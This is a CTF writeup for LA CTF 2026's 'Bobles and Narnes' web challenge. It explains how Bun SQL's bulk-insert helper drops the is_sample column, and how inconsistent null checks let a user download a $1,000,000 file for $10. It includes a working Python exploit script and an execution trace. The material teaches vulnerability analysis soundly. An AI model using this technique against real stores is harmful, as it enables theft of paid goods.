@@ -1,0 +1,176 @@
+---
+title: 'LA CTF 2026 - Bobles and Narnes'
+description: 'Writeup for Bobles and Narnes from LA CTF 2026. A Web challenge involving Bun SQL bulk insert injection and type confusion.'
+date: 2026-02-09
+tags: ['writeup', 'web', 'bun', 'sql-injection', 'type-confusion', 'lactf']
+authors: ['kudaliar']
+draft: false
+---
+
+**Flag:** `lactf{hojicha_chocolate_dubai_labubu}`
+
+## Overview
+
+Bobles and Narnes is a web challenge featuring an online bookstore built with Bun, Express, and SQLite. Users register with a starting balance of $1,000 and can purchase books. The flag is stored in a book priced at $1,000,000 — far exceeding our budget. The goal is to obtain the full `flag.txt` file without having enough balance.
+
+## Reconnaissance
+
+The application is a standard e-commerce flow:
+
+1. **Register/Login** — creates an account with $1,000 balance
+2. **Browse books** — four books available, including "Flag" at $1,000,000
+3. **Add to cart** — items can be added as "sample" (free) or "full" (costs money)
+4. **Checkout** — delivers purchased files as a zip archive
+
+### Key source files
+
+- `server.js` — all server logic
+- `books.json` — book catalog (flag book ID: `2a16e349fb9045fa`, price: 1,000,000)
+- `books/` — contains full and sample files; `flag_sample.txt` just contains `lactf{`
+
+## Vulnerability Analysis
+
+The vulnerability is a **type confusion bug caused by inconsistent object key handling in Bun's SQL bulk INSERT helper**, combined with three critical asymmetries in how `is_sample` is checked across different code paths.
+
+### The three checks on `is_sample`
+
+#### 1. Add endpoint — price calculation (JavaScript, on request data)
+
+```js
+// server.js:138-141
+const additionalSum = productsToAdd
+    .filter((product) => !+product.is_sample)    // JS coercion on REQUEST data
+    .map((product) => booksLookup.get(product.book_id).price ?? 99999999)
+    .reduce((l, r) => l + r, 0);
+```
+
+Items where `is_sample` is truthy (e.g., `1`) are **excluded** from the price sum — they're free.
+
+#### 2. Add endpoint — existing cart sum (SQL query)
+
+```sql
+-- server.js:132-137
+SELECT SUM(books.price) AS cartSum
+FROM cart_items
+JOIN books ON books.id = cart_items.book_id
+WHERE cart_items.username = ? AND cart_items.is_sample = 0
+```
+
+Uses strict SQL equality `is_sample = 0`. Crucially, `NULL = 0` evaluates to `NULL` (falsy) in SQL — so items with `NULL` `is_sample` are **invisible** to this check.
+
+#### 3. Checkout endpoint — file path selection (JavaScript, on database data)
+
+```js
+// server.js:170
+const path = item.is_sample ? book.file.replace(/\.([^.]+)$/, '_sample.$1') : book.file;
+```
+
+Uses plain JavaScript truthiness on the **database value**. `null` is falsy → serves the **full file**, not the sample.
+
+#### 4. Checkout has NO balance validation
+
+```js
+// server.js:164
+await db`UPDATE users SET balance=${balance - cartSum} WHERE username = ${res.locals.username}`;
+```
+
+Balance can go negative. There is no check that `balance >= cartSum`.
+
+### The trigger: Bun SQL `db()` bulk INSERT behavior
+
+The insertion code spreads user-controlled properties into the cart entries:
+
+```js
+// server.js:149-150
+const cartEntries = productsToAdd.map((prod) => ({ ...prod, username: res.locals.username }));
+await db`INSERT INTO cart_items ${db(cartEntries)}`;
+```
+
+Bun's `db()` helper determines the INSERT column names from the **first object's keys**. If the first object in the array is missing the `is_sample` property, the `is_sample` column is **omitted from the INSERT statement entirely**. SQLite then fills in the default value for all rows: `NULL` (since no `DEFAULT` is defined on the column).
+
+This means the second object's `is_sample: 1` value is silently **discarded** — it never reaches the database.
+
+## Exploit
+
+### Strategy
+
+Send a single `/cart/add` request with two products:
+
+1. **First product**: a cheap book ($10) **without** the `is_sample` key — this controls the INSERT column list
+2. **Second product**: the flag book **with** `is_sample: 1` — bypasses the JavaScript price check (treated as a free sample)
+
+Since `db()` derives columns from the first object (which lacks `is_sample`), both rows are inserted with `is_sample = NULL`.
+
+On checkout:
+- `NULL` is falsy in JavaScript → `item.is_sample ? sample_path : full_path` resolves to **full_path**
+- `flag.txt` is served instead of `flag_sample.txt`
+- Balance goes to -$999,010 — but checkout doesn't care
+
+### Exploit script
+
+```python
+#!/usr/bin/env python3
+import requests
+import random
+import sys
+import zipfile
+import io
+
+BASE_URL = sys.argv[1].rstrip("/")
+s = requests.Session()
+
+# 1. Register
+username = f"exploit_{random.randint(0, 999999)}"
+s.post(f"{BASE_URL}/register", data={"username": username, "password": "pw"})
+
+# 2. Add to cart — first object missing is_sample controls INSERT columns
+s.post(f"{BASE_URL}/cart/add", json={
+    "products": [
+        {"book_id": "a3e33c2505a19d18"},                    # $10 book, NO is_sample key
+        {"book_id": "2a16e349fb9045fa", "is_sample": 1},    # flag, "sample" (free)
+    ]
+})
+
+# 3. Checkout — NULL is_sample → full file served
+r = s.post(f"{BASE_URL}/cart/checkout")
+
+# 4. Extract flag from zip
+z = zipfile.ZipFile(io.BytesIO(r.content))
+print(z.read("flag.txt").decode())
+```
+
+### Execution trace
+
+```
+$ python3 exploit.py https://bobles-and-narnes.chall.lac.tf
+
+[*] Registering user: exploit_770676
+    Status: 302
+[*] Adding products with is_sample column trick...
+    Response: {"remainingBalance":990}
+[*] Checking cart...
+    Cart: {"cart":[
+      {"book_id":"a3e33c2505a19d18","is_sample":null},
+      {"book_id":"2a16e349fb9045fa","is_sample":null}
+    ],"balance":1000}
+[*] Checking out...
+    Status: 200, Content-Type: application/zip
+[+] Files in zip: ['flag.txt', 'part-time-parliament.pdf']
+```
+
+Notice both items show `is_sample: null` in the cart — confirming the column was omitted from the INSERT.
+
+## Summary
+
+| Step | What happens |
+|---|---|
+| Add request | JS sees `is_sample: 1` on flag → excludes from price (free). JS sees no `is_sample` on cheap book → includes price ($10). Total $10 ≤ $1,000 ✓ |
+| SQL INSERT | `db()` uses first object's keys → `(book_id, username)`. `is_sample` column omitted → both rows get `NULL` |
+| SQL cartSum | `NULL = 0` → `NULL` (false) → flag is invisible to future balance checks |
+| Checkout price | `!+null` → `!0` → `true` → flag IS counted → balance goes to -$999,010 (no validation) |
+| Checkout file | `null` is falsy → `book.file` → `flag.txt` (full file, not sample) |
+
+The root cause is a combination of:
+1. **Bun SQL's `db()` deriving INSERT columns from the first array element only** — allowing an attacker to control which columns are written
+2. **Inconsistent `is_sample` checks** — SQL `= 0` vs JS `!+val` vs JS truthiness behave differently for `NULL`/`null`
+3. **No balance validation on checkout** — allowing negative balances
